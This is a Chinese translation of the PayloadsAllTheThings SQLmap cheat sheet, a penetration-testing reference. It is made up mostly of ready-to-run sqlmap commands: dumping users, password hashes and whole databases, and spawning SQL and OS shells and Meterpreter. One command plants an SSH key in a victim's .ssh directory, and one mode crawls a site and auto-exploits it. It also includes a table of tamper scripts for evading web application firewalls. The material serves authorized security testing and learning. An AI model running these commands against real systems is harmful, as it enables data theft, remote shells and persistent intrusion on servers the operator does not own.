---
comments: true

---

# SQLmap

本章节内容译于[【PayloadsAllTheThings/SQL Injection/SQLmap】](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/SQLmap/) 

> SQLmap 是一款强大的工具，能够自动化检测和利用 SQL 注入漏洞，相比手动测试节省了时间和精力。它支持多种数据库和注入技术，在各种场景下都具有通用性和高效性。

> 此外，SQLmap 还可以检索数据、操作数据库，甚至执行命令，为渗透测试人员和安全分析师提供了一套强大的功能。

> 重新发明轮子并非理想之选，因为 SQLmap 经过专家的严格开发、测试和改进。使用可靠且得到社区支持的工具意味着你可以受益于既定的最佳实践，避免因遗漏漏洞或在自定义代码中引入错误而带来的高风险。

> 但你始终应该了解 SQLmap 的工作原理，并且在必要时能够手动复制其操作。



## SQLmap 的基本参数

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```



## 加载请求文件

SQLmap 中的请求文件是一个保存的 HTTP 请求，SQLmap 读取并使用该文件来执行 SQL 注入测试。该文件允许你提供一个完整且自定义的 HTTP 请求，SQLmap 可以利用它来针对更复杂的应用程序。

```powershell
sqlmap -r request.txt
```



## 自定义注入点

SQLmap 中的自定义注入点允许你精确控制 SQLmap 应该如何将**Payload**注入到请求中。在处理更复杂或非标准的注入场景时，这非常有用，因为 SQLmap 可能无法自动检测到这些场景。

通过使用通配符字符“`*`”定义自定义注入点，你可以更精细地控制测试过程，确保 SQLmap 针对你怀疑存在漏洞的请求特定部分进行测试。

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```



## 二次注入

二次 SQL 注入发生在恶意的 SQL 代码被注入到应用程序中，但并不立即执行，而是先存储到数据库中，并稍后用于另一个 SQL 查询。

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```



## 获取 Shell

* SQL Shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
    ```

* OS Shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
    ```
    
* Meterpreter: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
    ```

* SSH Shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
    ```



## 爬取和自动利用

此方法不建议用于渗透测试；仅应在受控环境或某些比赛中使用。它会爬取整个网站并自动提交表单，这可能导致向敏感功能（如“删除”或“销毁”端点）发送非预期的请求。

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = 非交互模式，通常 Sqlmap 会向你提问，此选项接受默认答案
* `--crawl` = 你想要爬取网站的深度
* `--forms` = 解析并测试表单



## SQLmap 的代理配置

要使用代理运行 SQLmap，你可以使用 `--proxy` 选项后跟代理 URL。SQLmap 支持多种类型的代理，如 HTTP、HTTPS、SOCKS4 和 SOCKS5。

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* HTTP 代理:

  ```ps1
  --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
  --proxy="http://user:pass@127.0.0.1:8080"
  ```

* SOCKS 代理:

  ```ps1
  --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
  --proxy="socks4://user:pass@127.0.0.1:1080"
  ```

* SOCKS5 代理:

  ```ps1
  --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
  --proxy="socks5://user:pass@127.0.0.1:1080"
  ```



## 模块

在 SQLmap 中，模块可以帮助你以特定方式调整注入，以绕过 Web 应用程序防火墙（WAF）或自定义清理机制。SQLmap 提供了多种选项和技术来模块用于 SQL 注入的Payload。



### 后缀和前缀

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=SUFFIX`: 注入**Payload**后缀字符串
* `--prefix=PREFIX`: 注入**Payload**前缀字符串



### 模块脚本

模块脚本是一种修改 SQL 注入**Payload**以逃避 WAF 或其他安全机制检测的脚本。SQLmap 配备了多种预构建的模块脚本，可用于自动调整Payload。

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comment
```


| Tamper                       | Description                                                  |
| ---------------------------- | ------------------------------------------------------------ |
| 0x2char.py                   | 将每个 (MySQL) 的 0x<十六进制> 编码字符串替换为等效的 CONCAT(CHAR(),…) 后缀 |
| apostrophemask.py            | 将撇号字符替换为其 UTF-8 全角对应字符                        |
| apostrophenullencode.py      | 将撇号字符替换为其非法双重 Unicode 对应字符                  |
| appendnullbyte.py            | 在Payload末尾附加编码的 NULL 字符                            |
| base64encode.py              | 基于 64 编码Payload中的所有字符                              |
| between.py                   | 将大于运算符 ('>') 替换为 'NOT BETWEEN 0 AND #'              |
| bluecoat.py                  | 在 SQL 语句之后的空格替换为有效随机空白字符。然后将字符 = 替换为 LIKE 运算符 |
| chardoubleencode.py          | 对Payload中所有字符进行双重 URL 编码（不处理已编码）         |
| charencode.py                | URL 编码Payload中的所有字符（不处理已编码） (例如，SELECT -> %53%45%4C%45%43%54) |
| charunicodeencode.py         | Unicode-URL-编码Payload中的所有未编码字符 (不处理已编码) (例如，SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
| charunicodeescape.py         | Unicode 转义Payload中的非已编码字符 (不处理已编码) (例如，SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
| commalesslimit.py            | 将格式如 'LIMIT M, N' 的实例替换为 'LIMIT N OFFSET M'        |
| commalessmid.py              | 将格式如 'MID(A, B, C)' 的实例替换为 'MID(A FROM B FOR C)'   |
| commentbeforeparentheses.py  | 在圆括号之前插入（内联）注释 (例如，( -> /**/()              |
| concat2concatws.py           | 将格式如 'CONCAT(A, B)' 的实例替换为 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' |
| charencode.py                | URL-编码Payload中的所有字符（不处理已编码）                  |
| charunicodeencode.py         | Unicode-url-编码Payload中的未编码字符 (不处理已编码)         |
| equaltolike.py               | 将等号运算符 ('=') 的所有实例替换为 'LIKE' 运算符            |
| escapequotes.py              | 斜杠转义引号 (" 和 ')                                        |
| greatest.py                  | 将大于运算符 ('>') 替换为 'GREATEST' 对应项                  |
| halfversionedmorekeywords.py | 在每个关键字之前添加版本化 MySQL 注释                        |
| htmlencode.py                | 使用代码点 HTML 编码所有非字母数字字符 (例如，‘ -> &#39;)    |
| ifnull2casewhenisnull.py     | 将格式如 'IFNULL(A, B)' 的实例替换为 ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ 对应项 |
| ifnull2ifisnull.py           | 将格式如 'IFNULL(A, B)' 的实例替换为 'IF(ISNULL(A), B, A)'   |
| informationschemacomment.py  | 在所有 (MySQL) “information_schema” 标识符的出现末尾添加内联注释 /**/ |
| least.py                     | 将大于运算符 ('>') 替换为 'LEAST' 对应项                     |
| lowercase.py                 | 将每个关键字字符替换为小写值 (例如，SELECT -> select)        |
| modsecurityversioned.py      | 用版本化注释包围整个查询                                     |
| modsecurityzeroversioned.py  | 用零版本注释包围整个查询                                     |
| multiplespaces.py            | 在 SQL 关键字周围添加多个空格                                |
| nonrecursivereplacement.py   | 将预定义的 SQL 关键字替换为适合替代的表示 (例如，.replace("SELECT", "")) 过滤器 |
| overlongutf8.py              | 转换Payload中的所有字符（不处理已编码）                      |
| overlongutf8more.py          | 将Payload中的所有字符转换为过长 UTF8 (不处理已编码) (例如，SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
| percentage.py                | 在每个字符前添加百分号 ('%')                                 |
| plus2concat.py               | 将加号运算符 ('+') 替换为 (MsSQL) CONCAT() 函数对应项        |
| plus2fnconcat.py             | 将加号运算符 ('+') 替换为 (MsSQL) ODBC 函数 {fn CONCAT()} 对应项 |
| randomcase.py                | 将每个关键字字符替换为随机大小写值                           |
| randomcomments.py            | 向 SQL 关键字添加随机注释                                    |
| securesphere.py              | 附加特制字符串                                               |
| sp_password.py               | 在Payload末尾附加 'sp_password' 以进行自动从 DBMS 日志中的模糊处理 |
| space2comment.py             | 将空格字符 (' ') 替换为注释                                  |
| space2dash.py                | 将空格字符 (' ') 替换为带有随机字符串和新行 ('\n') 的短划线注释 ('--') |
| space2hash.py                | 将空格字符 (' ') 替换为一个井号字符 ('#')，后跟随机字符串和新行 ('\n') |
| space2morehash.py            | 将空格字符 (' ') 替换为一个井号字符 ('#')，后跟随机字符串和新行 ('\n') |
| space2mssqlblank.py          | 将空格字符 (' ') 替换为来自有效替代字符集的随机空白字符      |
| space2mssqlhash.py           | 将空格字符 (' ') 替换为一个井号字符 ('#')，后跟新行 ('\n')   |
| space2mysqlblank.py          | 将空格字符 (' ') 替换为来自有效替代字符集的随机空白字符      |
| space2mysqldash.py           | 将空格字符 (' ') 替换为带有新行 ('\n') 的短划线注释 ('--')   |
| space2plus.py                | 将空格字符 (' ') 替换为加号 ('+')                            |
| space2randomblank.py         | 将空格字符 (' ') 替换为来自有效替代字符集的随机空白字符      |
| symboliclogical.py           | 将 AND 和 OR 逻辑运算符替换为它们的符号对应项 (&& 和         |
| unionalltounion.py           | 将 UNION ALL SELECT 替换为 UNION SELECT                      |
| unmagicquotes.py             | 将引号字符 (') 替换为多字节组合 %bf%27，一起使用通用注释（使其工作） |
| uppercase.py                 | 将每个关键字字符替换为大写值 'INSERT'                        |
| varnish.py                   | 添加假 HTTP 头 'X-originating-IP'                            |
| versionedkeywords.py         | 将非函数关键字用版本化 MySQL 注释括起来                      |
| versionedmorekeywords.py     | 用版本化 MySQL 注释括起来每个关键字                          |
| xforwardedfor.py             | 添加假 HTTP 头 'X-Forwarded-For'                             |

## 减少请求次数

参数 `--test-filter` 在你希望专注于特定类型的 SQL 注入技术或**Payload**时非常有用。相较于测试 SQLMap 提供的所有**Payload**范围，你可以将其限制为匹配某种模式的**Payload**，这样做在处理大型或响应缓慢的 Web 应用程序时更加高效。

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

默认情况下，SQLmap 以等级 1 和风险 1 运行，这将生成更少的请求。在没有明确目的的情况下提高这些值可能会导致大量耗时且不必要的测试。

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

使用 `--technique` 选项来指定需要测试的 SQL 注入技术类型，而不是测试所有可能的类型。

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```


## 在无需注入的情况下使用 SQLMap

即使没有利用 SQL 注入漏洞，SQLMap 仍然可以用于多种合法目的，特别是在安全评估、数据库管理和应用测试中。

你可以通过其端口而不是 URL 来访问数据库。

```ps1
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
```


## 参考文献

- [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
- [利用 Burp & 自定义 SQLMap Tamper 漏洞进行二次注入攻击 - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)